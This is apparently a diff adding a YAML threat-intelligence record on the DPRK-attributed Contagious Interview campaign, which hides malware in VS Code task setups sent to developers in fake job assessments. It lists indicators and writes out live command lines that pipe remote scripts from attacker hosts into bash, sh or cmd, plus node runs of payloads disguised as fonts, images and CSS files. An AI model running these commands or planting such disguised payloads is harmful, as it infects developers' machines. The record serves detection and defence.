@@ -1,0 +1,82 @@
+title: 'Contagious Interview: Tracking the VS Code Tasks Infection Vector'
+description: The DPRK-attributed Contagious Interview campaign continues to target
+  software developers through fake recruitment schemes disguised as technical assessments
+  and code reviews of projects hosted on platforms like GitHub.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes:
+  - curl
+  - wget
+  - powershell
+  - bash
+  - cmd
+  - node
+  command_lines:
+  - curl 'https://www.regioncheck.xyz/settings/mac?flag=8' | bash && nohup node .vscode/spellright.dict
+    > /dev/null 2>&1 &
+  - wget -qO- 'https://vscode-toolkit-bootstrap.vercel.app/settings/linux?flag=306'
+    | sh
+  - curl --ssl-no-revoke -L https://vscodesettingstask.vercel.app/api/settings/windows
+    | cmd
+  - node webfonts/fa-brands-regular.woff2
+  - node src/assets/card4.jpeg
+  - nohup node src/assets/card4.jpeg > /dev/null 2>&1 &
+  - node src/images/logo-red.svg
+  - nohup node src/images/logo-red.svg > /dev/null 2>&1 &
+  - (command -v node >/dev/null 2>&1 && node ./public/fontawesome/fa-solid-400.woff2)
+    || (where node >nul 2>&1 && node ./public/fontawesome/fa-solid-400.woff2) || echo
+    ''
+  - node src/app/globals_light.css
+  - node server/config/conf.js
+  - node server/data/util/conf.js
+  - node public/font/fa-brands-regular.woff2
+  - nohup fGEE src/assets/cardslREg > /dev/null 2>&1 &
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - curl -> www[.]regioncheck[.]xyz:80
+  - wget -> vscode-toolkit-bootstrap.vercel.app:443
+  - curl -> vscodesettingstask.vercel.app:443
+  - node -> www[.]vscodeconfig[.]com:80
+  - node -> www[.]regioncheck[.]xyz:80
+  - node -> vscode-load[.]onrender[.]com:443
+  - vscode -> jsonkeeper[.]com/b/QJZCGmeow
+  - vscode -> urlscan[.]io/dom/019bdb75-40cb-7548-abd5-4558496217d5/
+  file_activity:
+  - .vscode/spellright.dict
+  - webfonts/fa-brands-regular.woff2
+  - src/assets/card4.jpeg
+  - src/images/logo-red.svg
+  - ./public/fontawesome/fa-solid-400.woff2
+  - src/app/globals_light.css
+  - server/config/conf.js
+  - server/data/util/conf.js
+  - .vscode/tasks.json
+  - public/font/fa-brands-regular.woff2
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - www[.]vscodeconfig[.]com
+  - www[.]regioncheck[.]xyz
+  - vscode-load[.]onrender[.]com
+  - jsonkeeper[.]com
+  - urlscan[.]io
+  urls:
+  - hxxps://www[.]regioncheck[.]xyz/settings/mac?flag=8
+  - hxxps://vscode-toolkit-bootstrap.vercel.app/settings/linux?flag=306
+  - hxxps://vscodesettingstask.vercel.app/api/settings/windows
+  - hxxps://www[.]vscodeconfig[.]com/
+  - hxxps://www[.]regioncheck[.]xyz/
+  - hxxps://vscode-load[.]onrender[.]com/
+authors:
+- yosket
+reference: https://www.abstract.security/blog/contagious-interview-tracking-the-vs-code-tasks-infection-vector
+date_of_publication: May 01, 2026
+file_creation_date: May 01, 2026
